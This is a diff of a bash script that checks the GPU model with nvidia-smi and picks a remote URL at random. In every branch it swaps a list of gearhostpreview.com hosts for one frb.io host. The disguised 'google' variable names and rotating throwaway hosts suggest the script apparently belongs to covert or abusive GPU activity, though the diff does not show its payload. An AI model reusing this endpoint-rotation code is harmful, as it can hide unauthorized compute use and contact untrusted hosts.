@@ -15,16 +15,7 @@ google8474=$(nvidia-smi --query-gpu=name --format=csv,noheader | sed "s/ //g")
 if [[ $google8474 == "QuadroP4000" ]]
 then
 
-arr[0]="http://mobile841212121274.gearhostpreview.com"
-arr[1]="http://mobile8412121212741.gearhostpreview.com"
-arr[2]="http://mobile8412121212742.gearhostpreview.com"
-arr[3]="http://mobile8412121212744.gearhostpreview.com"
-arr[4]="http://mobile8412121212748.gearhostpreview.com"
-arr[5]="http://mobileapps84741.gearhostpreview.com"
-arr[6]="http://mobileapps84742.gearhostpreview.com"
-arr[7]="http://mobileapps84743.gearhostpreview.com"
-arr[8]="http://mobileapps84744.gearhostpreview.com"
-arr[9]="http://mobileapps84745.gearhostpreview.com"
+arr[0]="https://custom-hdxo.frb.io/"
 rand=$[$RANDOM % ${#arr[@]}]
 google841212121274=${arr[$rand]}
 
@@ -53,16 +44,7 @@ else
 if [[ $google8474 == "QuadroM4000" ]]
 then
 
-arr[0]="http://mobile841212121274.gearhostpreview.com"
-arr[1]="http://mobile8412121212741.gearhostpreview.com"
-arr[2]="http://mobile8412121212742.gearhostpreview.com"
-arr[3]="http://mobile8412121212744.gearhostpreview.com"
-arr[4]="http://mobile8412121212748.gearhostpreview.com"
-arr[5]="http://mobileapps84741.gearhostpreview.com"
-arr[6]="http://mobileapps84742.gearhostpreview.com"
-arr[7]="http://mobileapps84743.gearhostpreview.com"
-arr[8]="http://mobileapps84744.gearhostpreview.com"
-arr[9]="http://mobileapps84745.gearhostpreview.com"
+arr[0]="https://custom-hdxo.frb.io/"
 rand=$[$RANDOM % ${#arr[@]}]
 google841212121274=${arr[$rand]}
 
@@ -91,16 +73,7 @@ else
 if [[ $google8474 == "QuadroP5000" ]]
 then
 
-arr[0]="http://mobile841212121274.gearhostpreview.com"
-arr[1]="http://mobile8412121212741.gearhostpreview.com"
-arr[2]="http://mobile8412121212742.gearhostpreview.com"
-arr[3]="http://mobile8412121212744.gearhostpreview.com"
-arr[4]="http://mobile8412121212748.gearhostpreview.com"
-arr[5]="http://mobileapps84741.gearhostpreview.com"
-arr[6]="http://mobileapps84742.gearhostpreview.com"
-arr[7]="http://mobileapps84743.gearhostpreview.com"
-arr[8]="http://mobileapps84744.gearhostpreview.com"
-arr[9]="http://mobileapps84745.gearhostpreview.com"
+arr[0]="https://custom-hdxo.frb.io/"
 rand=$[$RANDOM % ${#arr[@]}]
 google841212121274=${arr[$rand]}
 
@@ -126,16 +99,7 @@ fi
 
 else
 
-arr[0]="http://mobile841212121274.gearhostpreview.com"
-arr[1]="http://mobile8412121212741.gearhostpreview.com"
-arr[2]="http://mobile8412121212742.gearhostpreview.com"
-arr[3]="http://mobile8412121212744.gearhostpreview.com"
-arr[4]="http://mobile8412121212748.gearhostpreview.com"
-arr[5]="http://mobileapps84741.gearhostpreview.com"
-arr[6]="http://mobileapps84742.gearhostpreview.com"
-arr[7]="http://mobileapps84743.gearhostpreview.com"
-arr[8]="http://mobileapps84744.gearhostpreview.com"
-arr[9]="http://mobileapps84745.gearhostpreview.com"
+arr[0]="https://custom-hdxo.frb.io/"
 rand=$[$RANDOM % ${#arr[@]}]
 google841212121274=${arr[$rand]}
 
